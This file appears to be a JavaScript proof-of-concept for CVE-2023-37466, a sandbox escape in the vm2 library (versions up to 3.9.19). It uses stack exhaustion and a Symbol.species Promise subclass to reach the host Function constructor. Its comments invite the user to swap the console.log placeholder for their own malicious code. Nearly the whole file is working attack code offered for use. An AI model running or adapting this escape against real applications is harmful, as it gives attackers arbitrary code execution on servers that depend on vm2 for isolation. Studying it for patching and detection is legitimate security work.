//version <= 3.9.19(any version)
//echo write malicious code in return process
//Modify malicious code in class malicious
//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37466
const {VM} = require('vm2-3-9-19');
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class Malicious {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { 
                    return err.constructor.constructor('console.log("You can write your malicious code here")')(); 
                }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));